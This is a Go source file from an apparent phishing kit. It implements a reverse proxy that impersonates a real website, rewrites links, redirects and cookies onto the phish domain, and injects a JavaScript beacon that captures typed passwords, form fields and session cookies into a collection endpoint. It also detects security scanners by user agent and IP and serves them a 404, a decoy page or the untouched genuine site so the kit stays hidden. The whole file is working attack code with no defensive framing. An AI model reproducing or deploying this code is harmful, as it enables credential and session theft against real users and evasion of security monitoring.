package phish

import (
	"bytes"
	"compress/gzip"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"regexp"
	"strings"
)

// collectPath is the credential-beacon endpoint (POST JSON, then 204).
const collectPath = "/__bhm/collect"

// Handler routes one shared listener across all phish sites by Host header.
type Handler struct {
	M *Manager
	// PublicURL, when set, is advertised instead of the raw listen address in
	// built links (used for display only).
	PublicURL string
}

// NewHandler builds a Handler for the manager.
func NewHandler(m *Manager) *Handler { return &Handler{M: m} }

func (h *Handler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	site, ok := h.M.ByHost(r.Host)
	if !ok {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	if r.URL.Path == collectPath {
		h.serveCollect(w, r, site)
		return
	}
	if site.Mode == ModeMirror {
		h.serveMirror(w, r, site)
		return
	}
	h.serveProxy(w, r, site)
}

// --- bot (scanner) filter ---

// matchBot reports whether a request looks like a security scanner/bot. UA
// patterns are matched case-insensitively (substring or regex); bot IPs may
// be single IPs or CIDRs.
func matchBot(site *Site, r *http.Request) bool {
	ua := strings.ToLower(r.UserAgent())
	for _, pat := range site.BotUA {
		if pat == "" {
			continue
		}
		if strings.Contains(ua, strings.ToLower(pat)) {
			return true
		}
		re, err := regexp.Compile("(?i)" + pat)
		if err == nil && re.MatchString(ua) {
			return true
		}
	}
	ip := net.ParseIP(clientIP(r))
	if ip == nil {
		return false
	}
	for _, cidr := range site.BotIPs {
		if strings.Contains(cidr, "/") {
			if _, n, err := net.ParseCIDR(cidr); err == nil && n.Contains(ip) {
				return true
			}
			continue
		}
		if net.ParseIP(cidr) != nil && net.ParseIP(cidr).Equal(ip) {
			return true
		}
	}
	return false
}

func clientIP(r *http.Request) string {
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return host
}

// --- credential capture endpoint ---

type collectPayload struct {
	URL     string            `json:"url"`
	Fields  map[string]string `json:"fields"`
	Cookies []Cookie          `json:"cookies"`
}

func (h *Handler) serveCollect(w http.ResponseWriter, r *http.Request, site *Site) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	body, err := io.ReadAll(io.LimitReader(r.Body, 64<<10))
	if err != nil {
		http.Error(w, "bad body", http.StatusBadRequest)
		return
	}
	var p collectPayload
	if err := json.Unmarshal(body, &p); err != nil {
		http.Error(w, "bad json", http.StatusBadRequest)
		return
	}
	cap := Capture{
		SiteID:    site.ID,
		Mode:      site.Mode,
		URL:       p.URL,
		IP:        clientIP(r),
		UserAgent: r.UserAgent(),
		Fields:    p.Fields,
	}
	for _, c := range p.Cookies {
		// Only session/auth-looking cookies are kept in the capture record;
		// the raw field dump still carries everything.
		if isSessionCookieName(c.Name) {
			cap.Cookies = append(cap.Cookies, c)
		}
	}
	cap.Username, cap.Password = pickCredentials(p.Fields)
	h.M.RecordCapture(cap)
	w.WriteHeader(http.StatusNoContent)
}

// isSessionCookieName reports whether a cookie looks session/auth related.
func isSessionCookieName(name string) bool {
	n := strings.ToLower(name)
	switch {
	case strings.Contains(n, "sid"), strings.Contains(n, "session"),
		strings.Contains(n, "token"), strings.Contains(n, "auth"),
		strings.Contains(n, "sess"), strings.Contains(n, "login"),
		n == "jsessionid", n == "phpsessid", n == "aspsessionid*":
		return true
	}
	return false
}

// pickCredentials maps the collected form fields onto username/password.
func pickCredentials(fields map[string]string) (string, string) {
	var user, pass string
	for name, val := range fields {
		n := strings.ToLower(name)
		if val == "" {
			continue
		}
		if pass == "" && (strings.Contains(n, "password") || strings.Contains(n, "passwd") || n == "pass" || n == "pwd" || n == "pw") {
			pass = val
			continue
		}
		if user == "" {
			user = val
		}
	}
	if user == "" {
		for name, val := range fields {
			n := strings.ToLower(name)
			if strings.Contains(n, "user") || strings.Contains(n, "email") || strings.Contains(n, "login") || strings.Contains(n, "account") {
				if val != "" {
					user = val
					break
				}
			}
		}
	}
	return user, pass
}

// serveProxy relays the genuine origin, rewriting it into the phish host and
// (optionally) injecting the credential-capture beacon. Requests that look
// like security scanners get the configured bot action instead — this is the
// DOMDIFFER trick that keeps scanners from ever seeing the kit.
func (h *Handler) serveProxy(w http.ResponseWriter, r *http.Request, site *Site) {
	if site.BotAction != BotNone && matchBot(site, r) {
		switch site.BotAction {
		case BotBlock:
			http.Error(w, "404 page not found", http.StatusNotFound)
			return
		case BotDecoy:
			html := site.DecoyHTML
			if strings.TrimSpace(html) == "" {
				html = "<!doctype html><title>Home</title><p>Welcome.</p>"
			}
			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			_, _ = w.Write([]byte(html))
			return
		case BotPassthrough:
			// Transparent relay: scanners see the genuine page byte-for-byte.
			raw := newRawProxy(site)
			raw.ServeHTTP(w, r)
			return
		}
	}
	target, err := url.Parse(site.TargetURL)
	if err != nil {
		http.Error(w, "bad upstream", http.StatusBadGateway)
		return
	}
	phishHost := requestHost(r)
	proxy := &httputil.ReverseProxy{
		Director: func(req *http.Request) {
			req.URL.Scheme = target.Scheme
			req.URL.Host = target.Host
			req.Host = target.Host
			if _, ok := req.Header["User-Agent"]; !ok {
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
			}
			if clientIP, _, err := net.SplitHostPort(r.RemoteAddr); err == nil {
				prior := req.Header.Get("X-Forwarded-For")
				if prior == "" {
					req.Header.Set("X-Forwarded-For", clientIP)
				} else {
					req.Header.Set("X-Forwarded-For", prior+", "+clientIP)
				}
			}
			req.Header.Set("X-Forwarded-Host", phishHost)
			req.Header.Set("Accept-Encoding", "gzip") // rewritten bodies must be decompressed
		},
		ModifyResponse: func(resp *http.Response) error {
			rewriteLocation(resp, site, phishHost)
			rewriteSetCookies(resp, phishHost)
			return rewriteBody(resp, site, phishHost)
		},
	}
	proxy.ErrorHandler = func(w http.ResponseWriter, r *http.Request, err error) {
		log.Printf("[phish] upstream %s: %v", site.TargetHost(), err)
		http.Error(w, "upstream unavailable", http.StatusBadGateway)
	}
	proxy.ServeHTTP(w, r)
}

// newRawProxy relays requests without any rewriting (scanner passthrough).
func newRawProxy(site *Site) *httputil.ReverseProxy {
	target, _ := url.Parse(site.TargetURL)
	return &httputil.ReverseProxy{
		Director: func(req *http.Request) {
			req.URL.Scheme = target.Scheme
			req.URL.Host = target.Host
			req.Host = target.Host
		},
	}
}

func requestHost(r *http.Request) string {
	host := r.Host
	if host == "" {
		host = r.URL.Host
	}
	return strings.ToLower(host)
}

func isHTMLResponse(resp *http.Response) bool {
	ct := strings.ToLower(resp.Header.Get("Content-Type"))
	return strings.Contains(ct, "text/html") || strings.Contains(ct, "application/xhtml")
}

// rewriteBody rewrites HTML bodies (host swap + optional capture beacon) and
// re-measures Content-Length for every other body the transport decompressed.
func rewriteBody(resp *http.Response, site *Site, phishHost string) error {
	if resp.Body == nil {
		return nil
	}
	body, err := io.ReadAll(resp.Body)
	_ = resp.Body.Close()
	if err != nil {
		return err
	}
	if enc := resp.Header.Get("Content-Encoding"); enc != "" && enc != "identity" {
		if gr, gerr := gzip.NewReader(bytes.NewReader(body)); gerr == nil {
			if plain, derr := io.ReadAll(gr); derr == nil {
				body = plain
			}
		}
	}
	if isHTMLResponse(resp) {
		body = rewriteHTML(body, site, phishHost)
		if site.Capture {
			body = injectCaptureJS(body, site.ID)
		}
	}
	resp.Header.Del("Content-Encoding")
	resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(body)))
	resp.Body = io.NopCloser(bytes.NewReader(body))
	return nil
}

// rewriteHTML replaces every upstream host reference with the phish host.
func rewriteHTML(body []byte, site *Site, phishHost string) []byte {
	for _, up := range site.upstreamHosts() {
		if up == "" || up == phishHost {
			continue
		}
		// Absolute, protocol-relative and bare-host occurrences in attributes,
		// CSS url() and JS string literals all collapse to the host swap.
		body = bytes.ReplaceAll(body, []byte("https://"+up), []byte("https://"+phishHost))
		body = bytes.ReplaceAll(body, []byte("http://"+up), []byte("http://"+phishHost))
		body = bytes.ReplaceAll(body, []byte("//"+up), []byte("//"+phishHost))
		// Dot-prefixed references (".google.com") must not be eaten by the
		// bare-host replace above, so mark and restore them.
		body = bytes.ReplaceAll(body, []byte("."+up), []byte("\x00D\x00"+up))
	}
	for _, up := range site.upstreamHosts() {
		if up == "" {
			continue
		}
		body = bytes.ReplaceAll(body, []byte("\x00D\x00"+up), []byte("."+phishHost))
	}
	return body
}

// rewriteLocation rewrites redirect targets pointing at upstream hosts.
func rewriteLocation(resp *http.Response, site *Site, phishHost string) {
	loc := resp.Header.Get("Location")
	if loc == "" {
		return
	}
	out := loc
	for _, up := range site.upstreamHosts() {
		if up == "" {
			continue
		}
		out = strings.ReplaceAll(out, "https://"+up, "https://"+phishHost)
		out = strings.ReplaceAll(out, "http://"+up, "http://"+phishHost)
		out = strings.ReplaceAll(out, "//"+up, "//"+phishHost)
	}
	if out != loc {
		resp.Header.Set("Location", out)
	}
}

// rewriteSetCookies strips the Domain attribute so cookies bind to the phish
// host (host-only), which keeps the relay working on any deployment domain.
func rewriteSetCookies(resp *http.Response, phishHost string) {
	cookies := resp.Cookies()
	if len(cookies) == 0 {
		return
	}
	resp.Header.Del("Set-Cookie")
	for _, c := range cookies {
		c.Domain = ""
		resp.Header.Add("Set-Cookie", c.String())
	}
	_ = phishHost
}

// captureJS is the injected credential beacon. It observes password/text
// inputs, buffers values, and reports on submit and on page hide so the
// genuine login request still proceeds untouched (transparent AiTM).
const captureJS = `<script data-bhm="%s">(function(){
var F={};var SENT={};
function fields(){var o={};var els=document.querySelectorAll('input,textarea');
for(var i=0;i<els.length;i++){var e=els[i];var t=(e.type||'').toLowerCase();
if(t=='hidden'||t=='submit'||t=='button')continue;if(!e.name&&!e.id)continue;
var v=e.value||'';if(v)o[e.name||e.id]=v;}return o;}
function changed(a,b){for(var k in b){if(a[k]!==b[k])return true;}for(var k in a){if(!(k in b))return true;}return false;}
function send(){var f=fields();if(!Object.keys(f).length)return;
var key=JSON.stringify(f);if(SENT[key])return;SENT[key]=1;
var body=JSON.stringify({url:location.href,fields:f,cookies:[]});
try{navigator.sendBeacon('/__bhm/collect',new Blob([body],{type:'application/json'}));}catch(e){
var x=new XMLHttpRequest();x.open('POST','/__bhm/collect',true);x.send(body);}}
document.addEventListener('input',function(ev){var t=ev.target;if(!t||(!t.name&&!t.id))return;
var t2=(t.type||'').toLowerCase();if(t2=='hidden')return;F[t.name||t.id]=t.value;},true);
window.addEventListener('submit',function(){send();},true);
document.addEventListener('submit',function(){send();},true);
window.addEventListener('beforeunload',function(){if(changed(F,{}))send();});
document.addEventListener('visibilitychange',function(){if(document.visibilityState==='hidden')send();});
})();</script>`

// injectCaptureJS appends the credential beacon script before </body> (or at
// the end of the body when no closing tag exists).
func injectCaptureJS(body []byte, siteID string) []byte {
	tag := fmt.Sprintf(captureJS, siteID)
	lower := bytes.ToLower(body)
	if i := bytes.LastIndex(lower, []byte("</body>")); i >= 0 {
		out := make([]byte, 0, len(body)+len(tag))
		out = append(out, body[:i]...)
		out = append(out, []byte(tag)...)
		out = append(out, body[i:]...)
		return out
	}
	return append(body, []byte(tag)...)
}
